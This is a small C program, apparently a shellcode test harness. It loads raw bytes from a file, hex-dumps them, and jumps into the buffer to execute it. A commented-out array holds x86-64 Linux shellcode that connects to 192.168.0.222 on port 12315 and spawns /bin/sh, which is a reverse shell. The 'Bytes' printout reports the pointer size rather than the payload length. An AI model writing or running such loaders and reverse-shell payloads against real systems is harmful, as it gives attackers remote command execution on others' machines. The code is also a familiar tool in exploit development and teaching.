/*
  @idhyt
  to run shellcode
*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
char shellcode[] = \
    "\x6a\x02\x5f\x6a\x01\x5e\x6a\x00"
    "\x5a\x6a\x29\x58\x0f\x05\x48\x97"
    "\x6a\x00\x48\xb8\x02\x00\x30\x1b"
    "\xc0\xa8\x00\xde\x50\x48\x89\xe6"
    "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
    "\x6a\x02\x5e\x6a\x21\x58\x0f\x05"
    "\x48\xff\xce\x79\xf6\x31\xc0\x50"
    "\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"
    "\x73\x68\x57\xb0\x3b\x48\x89\xe7"
    "\x31\xf6\x31\xd2\x0f\x05";
*/

void print(char* data, int len) {
  int x = 0;
  int y = 0;

  if (data == NULL) {
    return;
  }

  for (x = 0; x < len; x += 16) {
    printf("%p : ", &data[x]);

    for (y = 0; y < 16; y++) {
      printf("%2.2x ", *(&data[x] + y) & 0xff);
    }

    printf(" ");

    for (y = 0; y < 16; y++) {
      if (*(&data[x] + y) >= 0x20 && *(&data[x] + y) <= 0x7e) {
        printf("%c", *(&data[x] + y));
      } else {
        printf(".");
      }
    }

    printf("\n");
  }
}

void run_sc(char* sc) {
  /* ret is a function pointer */
  int (*func)();
  printf("Bytes: %d\n", (int)sizeof(sc));
  /* ret points to our shellcode */
  func = (int (*)())sc;
  /*
      shellcode is type caste as a function
      execute, as a function, shellcode[]
   */
  (int)(*func)();
  /* exit() */
}

int main(int argc, char** argv) {
  if (argc < 2) {
    printf("input shellcode raw path.\n");
    return -1;
  }

  FILE* fp = fopen(argv[1], "rb");
  if (fp == NULL) {
    printf("read error!\n");
    return -1;
  }
  fseek(fp, 0, SEEK_END);
  int size = ftell(fp);

  char* shellcode = (char*)malloc(size + 1);
  memset(shellcode, 0, size + 1);

  fseek(fp, 0, SEEK_SET);
  fread(shellcode, 1, size, fp);

  printf("\n---------------- shellcode (0x%x)----------------\n", size);
  print(shellcode, size);
  printf("---------------- end ----------------\n\n");

  run_sc(shellcode);
  return 0;
}
